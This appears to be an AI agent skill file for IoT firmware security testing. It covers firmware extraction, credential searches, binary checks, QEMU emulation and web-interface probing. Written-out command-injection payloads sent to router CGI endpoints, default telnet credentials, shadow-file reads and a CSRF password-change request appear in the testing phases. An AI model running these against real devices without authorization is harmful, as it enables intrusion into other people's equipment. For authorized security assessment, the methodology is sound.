---
name: iot-firmware
description: "IoT and embedded firmware security analysis. Firmware extraction, binwalk filesystem extraction, credential discovery, binary analysis, QEMU emulation, web interface testing. Triggers: 'iot firmware', 'firmware analysis', 'binwalk', 'firmware extraction', 'embedded security', 'iot pentest', 'embedded device', 'router firmware', 'iot vulnerability', 'firmware reverse engineering', 'squashfs extraction'."
---

# IoT / Firmware Security Analysis

Systematic firmware examination: acquire → extract → credential hunt → binary analysis → emulate → test.

## Install

```bash
apt-get install -y binwalk squashfs-tools firmware-mod-kit python3-pip \
  john hashcat ltrace strace gdb-multiarch file strings hexdump

pip install binwalk --break-system-packages

# QEMU for emulation:
apt-get install -y qemu-user-static qemu-system-arm qemu-system-mips

# Advanced extraction:
pip install ubi_reader --break-system-packages
apt-get install -y mtd-utils cramfs
```

---

## Phase 1: Firmware Acquisition

```bash
TARGET_VENDOR="vendor-name"
TARGET_MODEL="model-x"
FIRMWARE_DIR="/opt/firmware/$TARGET_MODEL"
mkdir -p "$FIRMWARE_DIR"

# Option 1: Download from vendor site:
# Search: site:$TARGET_VENDOR.com "firmware" download filetype:bin

# Option 2: Extract from update mechanism (capture traffic):
# Set up Burp proxy, trigger device firmware update → capture URL

# Option 3: Hardware extraction (UART/JTAG — physical access):
# Connect USB-UART adapter, find TX/RX pins, read at 115200 baud:
screen /dev/ttyUSB0 115200

# Initial analysis:
file firmware.bin
binwalk firmware.bin
strings firmware.bin | head -50
hexdump -C firmware.bin | head -20
```

---

## Phase 2: Extraction

```bash
FIRMWARE="firmware.bin"

# Primary extraction:
binwalk -e --run-as=root "$FIRMWARE" -d "$FIRMWARE_DIR"
cd "$FIRMWARE_DIR/_firmware.bin.extracted/"

# If squashfs:
ls -la *.squashfs 2>/dev/null
unsquashfs -d squashfs-root *.squashfs

# If cramfs:
mount -o loop *.cramfs /mnt/cramfs && cp -r /mnt/cramfs/* ./cramfs-root/

# If JFFS2:
binwalk -e *.jffs2 --run-as=root

# Recursive deep extraction:
binwalk -Me --run-as=root "$FIRMWARE"

# List extracted filesystem:
find squashfs-root/ -type f | head -100
ls -la squashfs-root/
ls -la squashfs-root/etc/
ls -la squashfs-root/var/
ls -la squashfs-root/usr/
```

---

## Phase 3: Credential Discovery

```bash
FS_ROOT="squashfs-root"

# Auth files:
cat "$FS_ROOT/etc/passwd" 2>/dev/null
cat "$FS_ROOT/etc/shadow" 2>/dev/null
cat "$FS_ROOT/etc/htpasswd" 2>/dev/null

# Search for password patterns in all files:
grep -rn "password\|passwd\|passw\|secret\|apikey\|api_key\|token\|credential" \
  "$FS_ROOT/" --include="*.conf" --include="*.cfg" --include="*.ini" \
  --include="*.xml" --include="*.json" -l 2>/dev/null

# Search in all files (broader):
grep -rl "password\|passwd\|secret" "$FS_ROOT/" 2>/dev/null | head -20

# Find hardcoded crypto keys:
grep -rn "BEGIN.*KEY\|BEGIN.*CERT\|BEGIN.*RSA" "$FS_ROOT/" 2>/dev/null
find "$FS_ROOT/" -name "*.pem" -o -name "*.key" -o -name "*.crt" 2>/dev/null

# Default credentials in web server configs:
find "$FS_ROOT/" -name "*.conf" -exec grep -l "auth\|user\|pass" {} \;

# Binary strings extraction for embedded creds:
find "$FS_ROOT/usr/sbin/" "$FS_ROOT/usr/bin/" -type f | while read f; do
  strings "$f" | grep -E "(password|secret|admin|root).*=|=[\"']?[a-zA-Z0-9]{6,}" 2>/dev/null
done | head -50
```

---

## Phase 4: Binary Analysis

```bash
FS_ROOT="squashfs-root"

# Find web server binary:
find "$FS_ROOT/" -name "httpd" -o -name "lighttpd" -o -name "nginx" -o -name "uhttpd" 2>/dev/null

# Check for command injection vectors in shell scripts:
find "$FS_ROOT/" -name "*.sh" -o -name "*.cgi" | while read f; do
  grep -n "system\|exec\|popen\|shell_exec\|\`" "$f" 2>/dev/null | head -5
done

# Find dangerous functions in binaries:
for bin in "$FS_ROOT/usr/bin/"* "$FS_ROOT/usr/sbin/"* "$FS_ROOT/bin/"*; do
  [ -f "$bin" ] || continue
  objdump -d "$bin" 2>/dev/null | grep -l "system\|popen\|execve" && echo "$bin"
  strings "$bin" 2>/dev/null | grep -E "system\(|popen\(|/bin/sh" | head -3
done

# Architecture detection:
file "$FS_ROOT/bin/busybox" 2>/dev/null || file "$FS_ROOT/bin/sh"

# Check for stack canaries / NX:
readelf -l "$FS_ROOT/usr/sbin/httpd" 2>/dev/null | grep -E "GNU_STACK|RELRO|BIND_NOW"
checksec "$FS_ROOT/usr/sbin/httpd" 2>/dev/null
```

---

## Phase 5: QEMU Emulation

```bash
ARCH="mipsel"  # or arm, mips, armle, aarch64
FS_ROOT="squashfs-root"

# Full system emulation (MIPS):
# Copy QEMU static binary:
cp /usr/bin/qemu-mipsel-static "$FS_ROOT/usr/bin/qemu-mipsel-static"

# Chroot into filesystem:
sudo chroot "$FS_ROOT" /usr/bin/qemu-mipsel-static /bin/sh

# Or bind-mount proc/sys:
sudo mount -t proc /proc "$FS_ROOT/proc"
sudo mount -o bind /dev "$FS_ROOT/dev"
sudo chroot "$FS_ROOT" /usr/bin/qemu-mipsel-static /usr/sbin/httpd -p 8080

# For ARM:
cp /usr/bin/qemu-arm-static "$FS_ROOT/usr/bin/"
sudo chroot "$FS_ROOT" /usr/bin/qemu-arm-static /usr/sbin/httpd
```

---

## Phase 6: Network Service Testing

```bash
DEVICE_IP="192.168.1.1"

# Port scan:
nmap -sV -p- --open "$DEVICE_IP"

# Common IoT service ports:
# 80/443 — web admin interface
# 23 — telnet (often default/no auth)
# 8080/8443 — alternative web
# 22 — SSH
# 8888 — management API
# 1900 — UPnP

# Test telnet (often default creds):
telnet "$DEVICE_IP" 23
# Common: admin/admin, admin/password, root/root, admin/"", root/"", user/user

# Web interface:
curl -sk "http://$DEVICE_IP/cgi-bin/login.cgi" | grep -i "password\|username"
curl -sk "http://$DEVICE_IP/" | grep -iE "firmware|model|version"

# Test command injection via web params:
# Common vectors: ping, traceroute, nslookup fields in web UI
curl -sk "http://$DEVICE_IP/cgi-bin/ping.cgi" \
  -d "host=127.0.0.1;id"

# UPnP enumeration:
nmap -p 1900 --script=upnp-info "$DEVICE_IP"
curl -s "http://$DEVICE_IP:1900/description.xml"
```

---

## Phase 7: Web Interface Vulnerabilities

```bash
DEVICE_URL="http://$DEVICE_IP"

# Command injection (most common in IoT):
INJECTION_ENDPOINTS=(
  "/cgi-bin/ping.cgi"
  "/cgi-bin/traceroute.cgi"
  "/cgi-bin/sysinfo.cgi"
  "/api/v1/diagnostic"
)

for ep in "${INJECTION_ENDPOINTS[@]}"; do
  curl -sk "$DEVICE_URL$ep" -d "host=127.0.0.1\nid" -H "Content-Type: application/x-www-form-urlencoded"
done

# Authentication bypass:
# Test: access /cgi-bin/status.cgi without auth cookie
curl -sk "$DEVICE_URL/cgi-bin/status.cgi" | grep -i "error\|login\|access denied"
# → 200 with data = auth bypass

# CSRF (no token check on config changes):
# Test state-changing endpoint without CSRF token:
curl -sk -X POST "$DEVICE_URL/apply.cgi" \
  -d "password=newpassword&confirm=newpassword" \
  -H "Referer: $DEVICE_URL/password.html"
```

---

## Output

Save to `.omop/engagement/iot/`:
- `firmware-extraction.txt` — filesystem structure, architecture
- `credentials-found.txt` — hardcoded passwords, SSH keys, API keys
- `binary-analysis.txt` — vulnerable function calls, missing protections
- `network-services.txt` — open ports, service versions
- `command-injection.txt` — web interface vulnerabilities

## Next Phase

→ `pentest-exploit` for exploitation of discovered vulnerabilities
→ `re-static` for deep binary reverse engineering
→ `pentest-report` for final report
